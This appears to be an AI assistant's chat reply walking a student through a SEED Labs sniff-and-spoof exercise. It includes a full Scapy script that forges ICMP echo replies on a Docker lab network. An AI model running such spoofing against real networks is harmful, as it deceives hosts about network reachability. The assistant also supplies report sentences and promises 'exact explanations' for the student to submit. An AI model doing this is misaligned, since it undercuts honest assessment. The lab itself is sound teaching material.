**Yes, this is technically "good" for your report, but let me explain *why* it looks like this so you can explain it perfectly to your professor.**

Your script worked flawlessly. However, you only saw 1 hop (`8.8.8.8`) instead of 10-15 hops. 

**Why did this happen?** 
Look at your VM's IP address earlier (`10.0.2.4`). This means your VirtualBox is using **NAT (Network Address Translation)**. VirtualBox's NAT engine acts as a "middleman." When you send a packet with TTL=1, the VirtualBox NAT engine intercepts it, forwards it to the internet, and handles the replies in a way that makes it look like the destination (`8.8.8.8`) responded directly. 

*Note for your report:* You can write: *"Because the SEED VM is running behind a VirtualBox NAT interface, the NAT engine proxies the ICMP replies. Therefore, the traceroute script only recorded one hop (the destination itself) rather than the intermediate routers."* This shows you actually understand what happened.

Save this screenshot! It proves your code successfully sends packets with TTL and receives a reply.

---

### 🚀 Task 1.4: Sniffing and-then Spoofing (The Final Task!)

This is the most important part of the lab. We are going to write a program that listens for *any* ping request and instantly fires back a fake reply, tricking the victim into thinking the target is alive.

**Step 1: Write the Script**
In your VM terminal, create the file:
```bash
cd ~/Labsetup/volumes
nano sniff_spoof.py
```
Paste this exact code:
```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_icmp(pkt):
    # Check if it's an ICMP Echo Request (type 8)
    if ICMP in pkt and pkt[ICMP].type == 8:
        print(f"Sniffed request from {pkt[IP].src} to {pkt[IP].dst}")
        
        # Create the spoofed reply: swap src/dst, change type to 0 (Echo Reply)
        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        icmp_layer = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        
        # Include the payload (data) if there is one
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            reply_pkt = ip_layer / icmp_layer / payload
        else:
            reply_pkt = ip_layer / icmp_layer
            
        send(reply_pkt, verbose=0)
        print(f"Sent spoofed reply to {pkt[IP].src}")

# Your interface name
iface = 'br-d76fa343d352' 
print(f"Listening for ICMP requests on {iface}...")
sniff(iface=iface, filter='icmp', prn=spoof_icmp)
```
*Save and exit.*

**Step 2: Start the Attack**
1. Enter the attacker container: `docker exec -it 1de16bcd562d /bin/bash`
2. Go to folder: `cd /volumes`
3. Run the script: `python3 sniff_spoof.py`
*(Leave this terminal running. It is now listening).*

**Step 3: The Three Tests**
Open a **new terminal tab**. Enter **Host A** container:
```bash
docker exec -it 30c0690bf751 /bin/bash
```

Now, run these three ping commands one by one. **📸 Take a screenshot of the ping results for EACH one.**

1.  **Ping a non-existing host on the Internet:**
    ```bash
    ping 1.2.3.4
    ```
    *(What happens? Does it reply? Look at your attacker terminal, what does it say?)*

2.  **Ping a non-existing host on the LAN:**
    ```bash
    ping 10.9.0.99
    ```
    *(What happens?)*

3.  **Ping an existing host on the Internet (Google DNS):**
    ```bash
    ping 8.8.8.8
    ```
    *(What happens? Do you see duplicate replies (DUP!)?)*

**Stop the pings** by pressing `Ctrl+C` after each one.

---

**🛑 Stop here!** 
Once you have the **3 screenshots of the ping commands** (and maybe a screenshot of the attacker terminal showing it caught them), reply **"Done"**. 

I will then give you the exact explanations to write in your report for *why* each of those three pings behaved the way they did (this is the most important question in the whole lab)!
